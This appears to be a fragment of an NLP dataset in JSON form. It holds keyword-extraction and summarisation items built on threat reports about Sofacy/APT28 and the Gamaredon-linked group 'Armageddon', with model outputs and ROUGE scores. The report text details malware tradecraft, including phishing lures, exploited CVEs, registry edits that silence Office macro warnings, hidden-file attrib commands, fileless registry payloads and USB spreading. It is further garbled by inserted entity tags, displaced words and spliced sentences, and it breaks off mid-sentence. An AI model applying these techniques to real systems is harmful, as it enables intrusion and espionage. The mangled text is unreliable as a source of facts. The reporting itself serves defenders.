CORESHELL; CORESHELL; CHOPSTICK; CHOPSTICK; JHUHUGIT; the latest evolution; the Sofacy implant; Java zero-days; Microsoft Office; NETUI; the attackers; summary; this year; NATO countries.", "ref_text": "<START-1>The report profiles the activities and tools of the advanced persistent threat (APT) group Sofacy, also known as APT28, Fancy Bear, Sednit, and STRONTIUM. Sofacy has targeted military and government entities since around 2008, with a focus on NATO countries. Sofacy has continuously expanded its arsenal of custom malware like CORESHELL, SPLM, JHUHUGIT, and AZZY. In 2015, the group was observed using zero-day exploits and a modified version of AZZY for widespread attacks on defense contractors. The attacks involve multi-stage malware with resilience via multiple backdoors on compromised systems. Every 10 minutes, the backdoor sends a new request to the server, which is expected to send back executable code and one of the following commands: a. Write a new file \u201c%LOCAL_APPDATA%\\dllhost.exe\u201d or \u201c%TEMP%\\dllhost.exe\u201d and execute it, then delete the file b. Write a new file \u201c%LOCAL_APPDATA%sechost.dll\u201d or \u201c%TEMP%\\sechost.dll\u201d and call its first exported function using \u201crundll32.exe\u201d or Windows API, then delete the file c. Run shellcode provided by the server in a new thread While processing the commands, the backdoor logs all errors and execution results. It also reads the contents of the file \u201c%APPDATA%\\chkdbg.log\u201d and appends it to the results before sending them to the C2 server. The module aborts the thread receiving C2 command after it fails to correctly execute commands more than six times in a row, i.e. if file or process creation fails. Sofacy has also developed USB data theft tools to exfiltrate data from air-gapped networks. Infrastructure analysis has revealed Sofacy's preferred hosting providers, command and control servers, and use of encryption and code obfuscation to avoid detections. The group frequently recompiles versions of its malware to bypass antivirus signatures. Sofacy is noted for its speed of attacks and innovation in malware and infrastructure. The report highlights the need for a multi-layered defense including traditional antivirus, patching, whitelisting, and monitoring to guard against the group's tactics. Overall, the report profiles Sofacy's capabilities, tools, infrastructure, and targeting, warning that the highly active group continues to enhance its arsenal despite takedowns of previous versions. Constant vigilance and an adaptive defense posture are required against the adaptable threat. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4050632911392405, "gpt3/lexical/rouge_rouge2": 0.1234119782214156, "gpt3/lexical/rouge_rougeL": 0.19891500904159132, "gpt3/lexical/rouge_rougeLsum": 0.19891500904159132, "gpt3_generated_text": ["The Sofacy group, also known as Fancy Bear, Sednit, STRONTIUM, and APT28, has been active since 2008, primarily targeting military and government entities in NATO countries. The group initially used a small implant called Sofacy or SOURFACE, which had similarities to the Miniduke implants. However, the two groups appeared to separate in 2014, with Miniduke switching to the CosmicDuke implant. In 2013, Sofacy expanded its arsenal and added more backdoors and tools, including CORESHELL, SPLM, JHUHUGIT, and AZZY. In recent years, the group has launched multiple waves of attacks using zero-day exploits in Microsoft Office, Oracle Sun Java, Adobe Flash Player, and Windows itself. The group has also developed a new generation of USB stealers and various implants, including JHUHUGIT and JKEYSKW. The speed and use of multi-backdoor packages are recurring characteristics of Sofacy's attacks. The article also mentions specific samples of the AZZY implant that were detected and blocked by security products, but the attackers quickly compiled and delivered new versions that were not initially detectable. These new versions appeared to be downloaded and installed by another malware."]}, {"split_name": "val", "sample_id": "val_108", "prompt_text": "Extract the keywords: [ORG] IntroductionWithin conducting hybrid aggression against [GPE] Ukraine , since [DATE] 2014 [ORG] Russian [ORG] Federation special services launched an open intelligence and sabotage activities . For that purpose , the capabilities of the existing cyber units have been strengthened and new units were created . Individuals were actively involved in organizing and conducting cyberattacks . [ORG] The [ORG] Security [ORG] Service [ORG] of [ORG] Ukraine has reliable data concerning cyberattacks by [ORG] APT28 ( Sofacy / Fancy [ORG] Bear ) , [PERSON] SNAKE ( [GPE] Turla ) , APT29 ( [ORG] Cozy [ORG] Bear / [ORG] The [ORG] Dukes ) . At the same time , some of the results of the criminal activities of these groups are well known to the public as targeted cyberattacks [ORG] BlackEnergy , [ORG] Industroyer and [ORG] NotPetya . Comparing with mentioned [ORG] APT , the hacker group \" [PERSON] Armageddon \" is relatively young , according to various sources \u2013 [DATE] 2013 - [DATE] 2014 , and were \u201c under radar \u201d in the beginning of activities . Also it needs no less attention from the competent authorities . Under relevant circumstances , the group is able to turn into a cyberthreat with consequences , the scale of which will exceed the negative effect of the activities of mentioned [ORG] APT groups.investigationThe outcomes ofinto cyber - attacks associated with the activities of the hacker group \" [PERSON] Armageddon \" are occasionally published in the reports of anti - virus laboratories and companies dealing with cybersecurity and providing cybersecurity services . [ORG] The [ORG] Security [ORG] Service [ORG] of [ORG] Ukraine considers to share with the [GPE] Ukrainian and world community its own vision of this cyberthreat and tries to shed more light on the group 's cyber operations , their purpose , tactics , techniques and procedures used by hacker groups , their evolution . The information is provided by [ORG] the [ORG] Security [ORG] Service [ORG] of [ORG] Ukraine to the extent that takes into account the legal restrictions on the regime of access to information . The hacker group \u2019s \" Armageddon\"/\"Armageddon\"profileThe Security Service of [GPE] Ukraine classifies the hacker group \" [ORG] Armageddon \" as [ORG] APT ( Advanced Persistent Threat ) , and unambiguously identifies it as a specially created structural unit of [ORG] the [ORG] Federal [ORG] Security [ORG] Service of [GPE] the [GPE] Russian [GPE] Federation , whose tasks are intelligence and subversive activities against [GPE] Ukraine in cyberspace.namesare GamaredonBearOther well - known(Eset , ( PWC)/IronTiden ( [PERSON] SecureWorks)/SectorC08 ( Red Alert ) , [ORG] Callisto ( [ORG] NATO [ORG] Association [ORG] of [ORG] Canada ) . The group is an integral part of the so - called \" [WORK_OF_ART] Office [WORK_OF_ART] of [WORK_OF_ART] the [WORK_OF_ART] FSB [WORK_OF_ART] of [WORK_OF_ART] Russia in [GPE] the [GPE] Republic [GPE] of [GPE] Crimea and the city of [LOC] Sevastopol \" , and consists of regular officers of the secret service and some former law enforcement officers of [GPE] Ukraine . [ORG] The [ORG] Security [ORG] Service [ORG] of [ORG] Ukraine believes that [PERSON] Armageddon was formed and has been operating since [DATE] 2014 ( some sources on the Internet indicate [DATE] June [DATE] 2013 ) . The main purpose of its activity is to conduct targeted cyberintelligence operations against state bodies of [GPE] Ukraine , primarily security , defense and law enforcement agencies , intelligence information.in order to obtainThe activity and development ofthe hacker group \" [ORG] Armageddon \" during [DATE] 2014 - [DATE] 2021 has led to the existence of a new real cyber threat . In the period 2017 - 2021 this group implemented the most numerous cyberintelligence actions on various vectors of public administration . [PERSON] Armageddon does not use complex and sophisticated techniques , tactics and procedures , does not try to make an effort to stay secret for a long time . Staying off the radar is not a group priority . However , the group 's activities are characterized by intrusiveness and audacity . It is evidenced by the name of the group \" [PERSON] Armageddon \" , which information contained in the metadata of the [ORDINAL] first created documents - baits;is taken from thecyber attacks algorithm repeatability and regular mass sending of malicious messages to the same circle of addressees ; derogatory password phrases encoded in malicious software , etc . The cyber attack mechanism is based on the principle of simultaneous mass destruction of a large number of users inside [CARDINAL] one organization and the deployment of malicious software . When the victim 's computer system loses control , the attackers try to regain access to the source of the information and try again to compromise them according to a similar scenario . Malicious software modules have been created with the help of programming languages [ORG] VBScript , [ORG] VBA [ORG] Script , C # , [LANGUAGE] C++ , as well as using [ORG] CMD , [ORG] PowerShell and .NET command shells . In fact , the group focuses on computer systems running the [PRODUCT] Windows , although we know about the test use of the EvilGnome malware ( to defeat Linux systems ) , as well as attempts to get access to [ORG] Android devices . Analysis of the group 's tactics since its [ORDINAL] first appearance on the \" landscape \" of cyberspace allows us to divide its activities into [CARDINAL] 2 periods : from [DATE] 2014 to [DATE] 2017 and from [DATE] 2017 to the present day . This divide is due to the evolution of tools . Though , there is little information about [GPE] Armageddon 's [DATE] early [DATE] days , based on the available data , members of the group relied on legitimate , publicly available software products in [DATE] the [DATE] early [DATE] years of their existence , which was eventually changed to customized malware [ORG] Pterodo / Pteranodon . At the [ORDINAL] first stage , the minimum required set of software consisted of dropper files sent with phishing emails , as well as remote access tools , which were installed after users opened malicious applications and provided to include RMS ( Remote the information system . Such tools [PRODUCT] Manipulator [PRODUCT] System ) and UltraVNC.remote accessThe [ORDINAL] second stage , starting in [DATE] 2016 , is characterized by the transition to customized malware called [ORG] Pterodo / Pteranodon , which widely expanded the functionality of the group . Phishing as a guarantee of an effective cyberattackThroughout its existence , the hacker group \" [PERSON] Armageddon \" has successfully used the methods of social engineering , especially sending to potential victims emails specially crafted messages with malicious attachments . This remains the main vector of cyberattack . This approach does not require significant costs , and information about the official mailing addresses of a government agency , unit or an official can be found in open sources.the movement ofin the [ORG] Donetsk and [GPE] Luhansk regions , Thus , [DATE] 2014 - [DATE] 2016 are characterized by sending emails on topics related to [ORG] the Anti - Terrorist [ORG] Operation ( now the [NORP] Joint forces and means , loss of personnel and military equipment , facts of desertions , analytical data on the activities of units of the security and defense sector of [GPE] Ukraine . The targets were , respectively , military personnel of the security and defense sector of [GPE] Ukraine , representatives of law enforcement agencies and other individuals who were involved in [ORG] the Anti - Terrorist [ORG] Operation / [ORG] the [ORG] Joint [ORG] Forces [ORG] Operation . Subsequently , in [DATE] 2017 - [DATE] 2019 , due to the partial cessation of lure active hostilities , the emphasis was shifted towards documents on criminal proceedings , international cooperation , draft legislation , with a simultaneous reorientation to users of the central offices of the security and defense sector of [GPE] Ukraine ( Figures 1 and 2).Figure 1 . A Phishing email sampleA simple method of putting pressure on the user was applied in many e - mails so that an electronic attachment was opened recklessly . The word \" Urgent \" was indicated in the title and/or text of the message , which was to force the employee to review the contents immediately and start the system infecting process accordingly . From [DATE] 2019 to the present day , [CARDINAL] almost [CARDINAL] half of such e - mails have been allegedly sent on behalf of state bodies , international organizations and individuals , and the lure documents became correspondence letters of [GPE] Ukrainian state bodies . At this stage , [PERSON] Armageddon is trying to expand its presence and carry out its cyberattacks on information systems of employees of central executive bodies in particular.international andinformation , Figures [CARDINAL] 2 . [CARDINAL] One more phishing email samplea message , According to the phishing e - mail samples analysis results , the systematic facts of real recipients replacement is worth noting . Usually , the field \" address from \" indicates the data ( primarily the domain name ) that corresponds to a real government agency , in particular , from which the recipient can at the appropriate time . The subject of the letter , its content and the title of the appendix reflect current information , which gives the letter even more legitimacy . Thus , a specially formed fake letter creates the illusion of credibility and encourages users to read the contents of the attached documents without suspicion . So , the opening of such applications by officials triggers the mechanism of downloading malicious software and infecting the information system.includingIt can be argued that special attention is focused on the investigative units of law enforcement agencies , which have been handling [CARDINAL] thousands of criminal cases since the beginning of the [NORP] Russian armed aggression against [GPE] Ukraine . In reality , the [ORG] Armageddon group created numerous mailboxes on the existing public services of [GPE] Russia ( @yandex.ru ) , [GPE] Ukraine ( [GPE] @i.ua ) , [GPE] the [GPE] Czech [GPE] Republic ( @popis.cz , @post.cz andlocated@email.cz ) , from which fake messages were actually sent . At the same time , such mailboxes were used as a cover for sending mails from pre - configured for this purpose mail servers , which were in [GPE] Russia and on the territory temporarily not controlled by [GPE] Ukraine . [ORG] The [ORG] Security [ORG] Service [ORG] of [ORG] Ukraine is aware of the facts of sending fake e - mails with malicious software from computers that used [PERSON] Russian [PERSON] IP - addresses ( IpServer , IT Expert providers ) , including the [NORP] Crimean telecom provider [ORG] Crelcom ( Simferopol).The mailbox \" lifetime \" was usually no [DATE] more [DATE] than [DATE] a [DATE] month , but there were some cases of sending fake messages from [CARDINAL] one mail for a much longer period . Figure [CARDINAL] 3 . A phishing email sample with embedded hide pixelA specific feature of the [DATE] 2019 letters was the embedded hidden pixel into their bodies , which was implemented due to the capabilities of the HTML markup language ( Figure [CARDINAL] 3 ) . For example:<imgsrc = url cached.gif height=\u00ab0 \u00bb width=\u00ab0 \u00bb style=\u00abheight:0px;width:0px\u00bb>At the same time , the minimal size parameters of the image set up by the attackers and its placement on the screen do not allow ordinary users to notice it . This feature allows hackers to track users who have read the email but have not opened the malicious attachment for unknown reasons . So , the implementation of a cyberattack begins with sending a phishing letter with a malicious attachment to a potential victim , the mechanism of automatic system and creating the preconditions for information leakage is launched.the opening of whichthe computerUsed [ORG] VulnerabilitiesThroughout the period of its activity , the hacker group\"Armageddon \" has been actively using [CARDINAL] 2 known vulnerabilities . Thus , up to version [CARDINAL] 5.70 , the most popular data compressor contained the WinRAR [ORG] ACE vulnerability ( CVE-2018 - 20250 ) , which allows to place files from archive to any folder on a victim \u2019s disk automatically , the background mode without victim \u2019s permission . Due to this , the attackers uploaded malicious files to various directories , which are used in Windows for automated launch of user programs ( [ORG] StartUp ) . This created the opportunity of persistent presence in the victim \u2019s information systems and regular malware launches.inIt is worth noticing that this vulnerability had existed for [DATE] almost [DATE] 20 [DATE] years and became known only in [DATE] 2019 . The developers have now fixed this bug , so users need to update the WinRAR software to the latest version . Vulnerability of CVE [DATE] 2017 - 0199 has been known since [DATE] 2017 as [ORG] Microsoft [ORG] Office [ORG] Remote [ORG] Code [ORG] Execution [ORG] Vulnerability and allows to execute arbitrary code in the victim 's system remotely after documents with the extension .rtf , .docx , .doc are opened . [ORG] Tactics , [ORG] Techniques [ORG] and [ORG] Procedures [ORG] Evolution With the goals of obtaining documentary files from the systems of [GPE] Ukrainian state bodies , the hacker group \u2019s TTPs \" [PERSON] Armageddon \" have gone through several stages of their evolution.(TTPs)Malicious software was intended to provide remote access to the system , the ability to execute commands on it , data collection and exfiltration , distribution to systems without an Internet connection ( via removable data storages ) etc . It is worth mentioning that in terms of architecture and implementation complexity , the used tools are not sophisticated , but have proven to be quite effective . Throughout the period of criminal activity , the group did not show a desire for lateral movement within the network . The group \u2019s TTPs provided mass compromising of user \u2019s systems as a result of malware targeted delivery to them and infecting each individual system . That happened until 2021.As it was already stated , the group uses droppers to deliver malware , which are delivered via malicious e - mails . At the stage of its installation an archive in SFX format was sent to the victim together with a phishing letter . While unpacking this [ORG] the [ORG] Remote [ORG] Manipulator [ORG] System ( developed by the [NORP] Russian company \" TektonIT \" ) was deployed . At the final stage , the deployment of remote access tools , as well as tools for collecting information takes place . At the stage of its formation with the phishing letter , in an archive SFX format , [ORG] Remote [ORG] Manipulator [ORG] System ( developed by the [NORP] Russian company \" TektonIT \" ) was sent to the victim . However , almost immediately , it was replaced by another remote access tool , the use of which is still recorded , \" UltraVNC \" ( Figure [CARDINAL] 4 ) - free software for the Windows operating system that uses the [ORG] VNC protocol ( a tool for remote management of other information systems).Figure [CARDINAL] 4 . UltraVNCThe group was also looking for software with the ability to identify and retrieve data from removable data storages , as well as isolated ( not connected to the Internet ) information systems . From [DATE] 2014 [DATE] to [DATE] 2016 it is known about the usage of the file ChkFlsh.exe ( mikelab.kiev.ua).At the same time , the main tool of the hacker group [ORG] Armageddon from [DATE] 2016 has been malicious software [ORG] Pterodo , which actually allowed to solve key issues of deployment in the targeted system , securing and conducting intelligence activities . [ORG] Pterodo / Pteranodon [ORG] malwarePterodo malware is a customized remote administration tool which has a modular structure and covers a wide range of different functions , namely:- before performing malware tests the environment in which it runs and tries to identify [ORG] Sandboxes ; - downloads and uses additional modules ; - takes screenshots at a specified frequency ; - gets access to cameras and a microphone ( if available ) ; - provides the ability to remotely execute commands within the system;- checks connected removable data storages and copies itself on / from for distribution to the systems that are separated from the Internet . It is known that the core of [ORG] Pterodo has been publicly available on [NORP] Russian hacker forums from [DATE] 2016 , and [CARDINAL] one of the detected modules responsible for decrypting the data was posted on [GPE] Github by a user with the nickname \" asu2010 \" and was also described on the [NORP] Russian Internet portal [GPE] Habrahabr . Pterodo is a type of malware that is designed for Windows and is aimed at defeating the version from Windows XP to Windows 10.Today , [ORG] Pterodo has changed a lot . During the period of active monitoring of the group 's activities and the results of cyberattacks investigations , [ORG] the [ORG] Security [ORG] Service [ORG] of [ORG] Ukraine has looked into a large number of malware samples , on the basis of which it was concluded that several methods of implementation had changed . The use of malware Pterodo on continuing basis began in [DATE] 2017 . The main idea of it was making the existing modules collection and their packaging into the archive . Also , a lure document was necessarity added to the archive , which is displayed to the user to hide suspicion of unauthorized actions . After opening the received application ( self - extracting archive with extension files .dll and .cmd , Figure [CARDINAL] 5 ) , malicious modules are downloaded to certain directories and executed in hidden mode . Figure [CARDINAL] 5 . A set of malware files in [CARDINAL] one of the casestheoperatingThe virus provides the following actions : the virus copies folders its files to % APPDATA%\\Microsoft\\Windows\\Start and [PERSON] Menu\\Programs\\Startup , and registers itself in the task scheduler ( Figure [CARDINAL] 6 ) in order to wait for action from the command & control server ( C2).systemstartupIn earlier versions , command & control servers were hard- coded , but from [DATE] 2019 the [ORG] SSU noticed additional configuration files with backup \u04212 list . Figure [CARDINAL] 6 . An example which demonstrate unauthorized scheduler taskThe algorithm for unpacking , placing files into directories and their subsequent launch is encoded in a tron.cmd . This file is a orchestrator which is responsible for managing the entire package of malicious modules . The LocalSMS.dll file is a dropper that communicates with the command & control server and loads other modules . In order to do that , the information about the computer is collected : computer name , user list , list of logical drives in the system , installed updates , etc . All this information is written to a file and sent to a specific server . In many cases , the malware has the functionality of dumping credentials for authorization on the internal proxy server from the OS registry , and its application if necessary ( Figure 7).Figure [CARDINAL] 7 . Code for dumping proxy credentialswinrestore.dllis a tool responsible for creating andcollecting screenshots . It should be noted that the set of modules changed with every new wave of attack , with the expectation of loading the necessary components after fixing in the system ( depending on current needs ) . At the same time , the servers are configured in such way that attempts to load the malware components for research were unsuccessful , and the server response was [CARDINAL] 404 Not Found . This is due to additional settings / parameters of the request ( for example , the [ORG] IP is not in the white list to which you can download further malware from the link , inappropriate user agent ) . This filters computers that are of interest to the attacker . During the period 2018 - [DATE] 2019 , together with the [ORG] SFX- archives , the victims received letters with attached .scr files ( screensaver ) , which masked the standard .exe extension for such file types . This file contains a thematic office document ( no [PERSON] macros),as well as a malware dropper . The last file is a free [ORG] WGET console bootloader that connects to the command server and downloads a new software module that uses the systeminfo command to generate a list of required information and the name of the bot generated from the PC name and logical drive serial number ( % computername% _ logicaldiskserial ) . After sending system information , in response , the main function modules are loaded , which allow remote execution of commands . The task scheduler creates a task to periodically run of the malware in order to have resilience for rebooting . Another mechanism for downloading malware modules was to create an allegedly attached archive file in an email using HTML , which , when clicked , communicates to a remote server using a specific download link . Thus , the [ORDINAL] first - stage malware was delivered to the victim 's information system . At the same time , it turned out that depending on the operating system and the transition time , the victim received different content . On [DATE] the [DATE] day of the investigation , before [CARDINAL] 10 a.m , the .scr archive was downloaded , and after [TIME] 11 [TIME] a.m. , the .rar archive was downloaded from the same link . At some time , when communication initiates from a mobile [ORG] Android device , the user 's browser redirected to the phishing page Google Play url [ .]com/ ( hosting provider [PERSON] Expert [PERSON] Llc ) . However , the download did not take place , and the page of the real Google market service was opened ( Figure [CARDINAL] 8) . Thus , we can assume the deployment of these resources to conduct a cybercampaign to compromise mobile terminals . Figure [CARDINAL] 8 . Content view for mobile devicesDuring this period , [ORG] the [ORG] Security [ORG] Service [ORG] of [ORG] Ukraine also found some sample files that contained [ORG] Windows [ORG] Management [ORG] Tools ( [ORG] WMI ) commands to determine the location of the information system , as well as the use of non - numerous scripts on [ORG] PowerShell . [ORG] PowerShellThe [ORG] Security [ORG] Service [ORG] of [ORG] Ukraine has detected Armageddonusing [CARDINAL] two types of [ORG] PowerShell scripts . [CARDINAL] One of them is designed to obtain information about the user and the information system , sending it to the command & control server , loading in response an additional module \u2013 the executable file with its simultaneous hidden start ( Figure [CARDINAL] 9).Figure [CARDINAL] 9 . [ORG] PowerShell script exampleAnother script file contained [CARDINAL] 4039 lines of program code . At the same time , [ORG] PowerShell commands were actually intended to execute code in the C # programming language . Analysis of this code showed that its functional purpose was to connect to the command & control server the appropriate domain , retrieve data from it , loaded data into the executable file and to run it ( Figure [DATE] 10).inFigure [DATE] 10 . [ORG] PowerShell script example with C#However , it should be noted that [CARDINAL] only [CARDINAL] about [CARDINAL] 200 lines of code are actually functional . All other lines are generated only for distraction , which can be attributed to the program code obfuscation technic . In fact , the [ORDINAL] first stage now lies in downloading the [ORG] WGET console utility and scripts to run it , set up persistence for rebooting by making changes to the registry and/or task scheduler , as well as collecting information about the system ( computer name , disk name , [ORG] IP - address , login and password to access the [LOC] Proxy ) and send the collected information to [CARDINAL] C2 ( Figure [DATE] 11).Figure [DATE] 11 . Sending data to command & control serverintheIn many batch files , the use of commands that changed the byvalues \" HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\A dvanced\\Hidden \" to \" [DATE] 00000002 \" was noticed , which allows to corresponds to changing the parameter show hidden files , folders and drives in the folder settings.the user . Thisregistryfiles andfoldersfromHaving created conditions for constant presence in the system and receiving constant requests from the victim 's system , the group filters bots with the main malicious software . Also since [DATE] the [DATE] end [DATE] of [DATE] 2019 , [PERSON] Armageddon started to implement [ORG] VBSscipts , which completely replaced cmd files later and became the malware [ORG] Pterodo persistence and download new specialized modules.the main scripts into be deployedfor the system , Full usage of [ORG] VBSscipts group has begun in [DATE] 2020 and has n\u2019t been stopped till [DATE] this [DATE] day . The conditions for this are actually created due to the existence of the CVE 2017 - 0199 vulnerability . By examining the code of numerous files and their relationships , it is possible to draw conclusion aboutthe following mechanism of compromising the victim 's system . The recipient receives and opens an office electronic document ( .docx , .doc , .rtf format ) with a built - in file link to download a remote template . In response , a template file ( .dot ) is sent with built - in macros , the execution of which provides the initial stage of the information system compromising . This mechanism can be implemented in MS Word , Exel , [ORG] PowerPoint ( Figure [CARDINAL] 12).Figure [CARDINAL] 12 . Built - in reference to download a dot fileAs a result , the malicious [ORG] VBA code deletes the Windows DNS cache using the ipconfig / flushdns command , decodes the [PERSON] Base64 strings , places the vbs file in the specified way , writes the code to it , and finally creates a task in the task scheduler on behalf of Administrator to run this file using VBS ( wscript.exe - standard Windows utility for executing VBS scripts ) with a certain frequency ( for [TIME] example [TIME] 5 [TIME] minutes ) every day . HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersi on\\Run\\LnkAt the same time , the settings of [ORG] Microsoft [ORG] Office [ORG] Word for invisible documents damage are changed in the registry and run the malware using [ORG] VBA . Changes occur in the registry branch HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\Version\\Word\\ Security with keys AccessVBom and [ORG] VBAWarnings . By default , these keys are set to \" 0 \" . As a result of unauthorized actions , they are set to \" 1\" . This bypassing [ORG] Microsoft [ORG] Office by default settings method is used to automatically run trusted external or untrusted macros and any [ORG] VBA code without displaying a security warning or obtaining user permission . Besides , any victim that allows macros to run once from a malicious file will be opened to macro- based attacks . The victim will unknowingly distribute the same malicious code among other users , transferring infected office documents from [CARDINAL] one system to another.thefromautostartThe vbs file is started at login due to the corresponding HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersi [ORG] on\\Run [ORG] HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersi on\\RunOncebranchoftheAs a result of startup , a unique user agent is generated , which transmits data on the computer name and serial number of the system disk ( HEX - value ) to the command and control server ( according to the domain name defined in the code).In case of a failed request , the script code provides the ability to search for actual C2 IP - address by known domain ( Figure [CARDINAL] 13 ) and repeats the query at the following link http://{IP address domain name at runtime}/php file name . If the server responds successfully , the received data is written to a new executable file . Figure [CARDINAL] 13 . Resolving domain to IPIt should be noted that the new file has the same name and location as the previous one , so it checks its existence before code will be written . If present , the previous file is deleted . The same names are misleading because the contents of all the files are different . The analysis of other scripts revealed the followingadditional functionality:- checking the mshta.exe process in the list of running processes and terminating it;- suspending its work for some time / random period in the range , determining start time and complete stop;- checking for a process with the same name in the list of running processes and finishing it;- repeating the cycle laid down in the file , which allows you to download and run almost any file in the system and provides full control over the system;- checking the file size before start and in case of conformity to conditions , the file is started;- searching for all available disks with \" D \" to \" Z\";letters from- checking for the possibility of creating and executing processes , as well as the presence of a connection to the Internet and to the command & control server of attackers;- downloading tasks from the task scheduler . It should be noted that along with vbs files , lnk shortcut files can be downloaded to the victim 's computer , which use open folder icons from the [GPE] shell32.dll library with i d = [CARDINAL] 126 and contain links to download and execute C2 files using program mshta.exe . The investigation also came across html files capable of creating malicious vbs scripts and simultaneous entries in the [PERSON] HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVeris on\\Run\\Lnk to execute them . Also among the aspects of the group 's work the use of [ORG] PE files should be noted , which require a text file format .txt , with a list of command and control servers of attackers . When a [ORG] PE file is executed , it connects to the [ORDINAL] first C2 address in the list , which loads any executable file that is stored in % Temp% and starts its execution . The file name consists of [DATE] 8 [DATE] 0123456789 + .exe.charactersThe [ORDINAL] second address from the txt file is used to update the list of attackers ' command and control servers . This functionalityis used when it is not possible to connect to the [ORDINAL] first address in the list . However , as mentioned before , if necessary , the link is changed to the current [ORG] IP address to reconnect . FileStealerFiles of this type have the extension .exe written in the C # programming language using the .NET framework and are designed to collect files with the following extensions : * .doc , * .docx , * .xls , * .rtf , * .odt , * .txt , * .jpg , * .pdf . These files are collected from all active disks except CD drives . At the same time , files that are located in the following ways are ignored : \\Users\\All Users , \\Windows , \\Windows\\TEMP , \\Program [PERSON] Files , \\Program [PERSON] Files ( x86 ) , \\ProgramData , \\AppData . During the operation of such modules , files with databases % [PERSON] Appdata%\\db.bin are created . These files contain MD5 hashes of file names that have been copied . In the future , these files are used to check the presence of already received files and extract only unique data . This indicates the obvious purpose of the hacker group to collect and steal electronic documentsArmageddon systematically . In addition , the functionality of these modules also includes the creation of screenshots from victims \u2019 screens . The names of the screenshots are based on the date of its creation in the format yyyy - MM - dd - h - mm + . jpg.folders%Temp%\\servicehubs\\Both , collected documents and screenshots are stored in % \\AppData\\Local\\servicehubs\\ , as well as other locations with typical [LANGUAGE] English names \" SCREEN \" , \" [ORG] USB \" . Subsequently , all data from the directory % Temp%\\servicehubs\\ using HttpWebRequest method [ORG] POST are sent to C2 and then deleted . The task to run the hijackers is set in the system task scheduler and executed [TIME] every [TIME] 5 [TIME] minutes . New [DATE] 2021 TTPs In [DATE] 2021 , [ORG] the [ORG] Security [ORG] Service [ORG] of [ORG] Ukraine revealed the facts of uploading files from the legitimate PSTOOLS set to the victims ' systems and attempts to run the [ORG] PSEXEC utility to execute commands on remote workstations . All this happened in systems where we observed elements of running files that correspond to mimikatz for Windows - the most common means of intercepting open sessions in Windows , which allows you to extract the authentication data of users who are logged in . Given the obtaining the credential of network administrators and users , the efforts of [GPE] Armageddon members to advance within the network and provide control over other workstations as well as server equipment are obvious . Another aspect of the Armageddon \u2019 progress is to ensure a permanent presence in the system with the minimization of malicious files on the hard drive . In this case , the capacity of the registry and task scheduler is used ( Figure [CARDINAL] 14).Thus , the scheduler creates a task to receive and execute aset of commands from the system registry . Figure [CARDINAL] 14 . Registry values41 keys with data parts are created in the registry branchHKEY_USERS\\\"USER\"\\Enviroment\\userData1 \u2026 userData41.Duringthe operation ofthe malware , concatenated and a malicious process compromised system.this datais is started on theThe malicious code is used to collect information about the victim 's system ( computer name and serial numbers of hard drives ) , which is sent to the attacker 's command & control server . If the connection is successful , the response will result in another malicious code encrypted is immediately decrypted and executed without creating a file in the user 's system.in base64 , whichIn this way , attackers create the conditions to minimize detection by cybersecurity tools and provide the ability to deliver various malicious codes . At the same time , infected Normal.dotm template files were found on the affected computers , which contained malicious links to download macro files from command & control servers . C:\\Users\\ \\AppData\\Roaming\\Microsoft\\\u0428\u0430\u0431\u043b\u043e\u043d\u044b\\Normal.dotmThe Normal.dotm file opens with the launch of MS Word , contains a customized set of user parameters that are responsible for the basic settings of documents ( fields , styles , font size , etc . ) . All these parameters will be stored in other documents that will be created on their basis in the future , regardless of the users and computer equipment that will prepare them . Thus , each new electronic document created on the affected system in MS Word contains code for connecting to C2 and downloading files with a set of malicious macros , the execution of which triggers the mechanism of compromising the information system . The exchange of such electronic documents actually creates a technical channel for the distribution of malware through trusted sources . Avoiding detection and checking the operational environmentits functionalityIn the process of evolution of malicious software , it was found that involves checking the startup environment , the operation of network monitoring tools and the presence of antivirus software . The group \u2019s use of the following go.microsoft.com;- in the list of running processes the program wireshark.exe , as well as processexplorer.exe detecting;- detecting the execution environment according to the coded list with known names of \" sandboxes\" . USBstealersAn important tool in the activities of the hacker group [ORG] Armageddon are the files that distribute the malware through the connected removable media , as well as collect and steal it from these media . The CSSC ( Cyber Security Situational Centre ) of [ORG] the [ORG] Security [ORG] Service [ORG] of [ORG] Ukraine revealed several instances when this type of malware was used within cyber attacks against critical objects , and the mechanism of their implementation is carried out according to the following algorithm . Once persistence mechanism is implemented in the victim 's system , the orchestrator cmd file checks the presence of connected removable data storage and copies PE files from the directory % APPDATA%\\Microsoft\\Crypto\\keys\\serial number of the volume\\executable file every 5 minutes . During the copying process , the file name is changed , and the file hiding attributes are set toattrib + h + s /s E:\\***.exeA shortcut called New folder is created on the attached media through the marker \" [CARDINAL] 3 \" from the shell32 library , as well as the Boot directory with the attributes of hidingattrib + h + s /d /s E:\\BootAlso during the code work in the removable data storage available electronic documents are collected and transferred to the folder < RemovableDrive>\\Boot\\UA%RANDOM%.%%Q Bootwithattributesattrib + h E:\\Boot\\*.docHidden documents are replaced by shortcuts that link to the original documents so that the user does not notice the substitution . [GPE] New [GPE] Folder shortcut contains a command to run the existing on the media [ORG] PE file to copy and rename it to the system disk . Infact , thisaas wellasacreatesserialnumber , procedurefolder the name of % APPDATA%\\Microsoft\\Crypto\\keys\\ with \\%APPDATA%\\Local\\Temp\\7ZipSfx.000 ( instead of \" 000 \u201d there may be a different sequence number depending on how many times the executable file has been run ) . After copying and unpacking , the orchestrator file with a set of cmd commands ( including the object - specific parameter ) infection mechanism is launched . At the same time , it is worth mentioning that full - fledged compromise is possible in case there is access to the Internet to download additional modules . [ORG] Command [ORG] & [ORG] Control [ORG] InfrastructureThe [ORG] Security [ORG] Service [ORG] of [ORG] Ukraine has obtained data on [CARDINAL] thousands of [ORG] Armageddon \u2019 command & control servers , which were involved in creating the appropriate telecommunications infrastructure and organization of communication channels , malware delivery and data exfiltration . Based on the analysis of the collected information , thefollowing conclusions are made . At the beginning of the group 's activity , a few domain names were registered in the .ru domain zone . However , with the expansion of the offensive bridgehead , the practice of creating a widely branched telecommunications infrastructure in the domain zone \" ddns.net \" ( registrar of the [NORP] American company [ORG] Vitalwerks [ORG] Internet [ORG] Solutions [ORG] LLC ) , using the 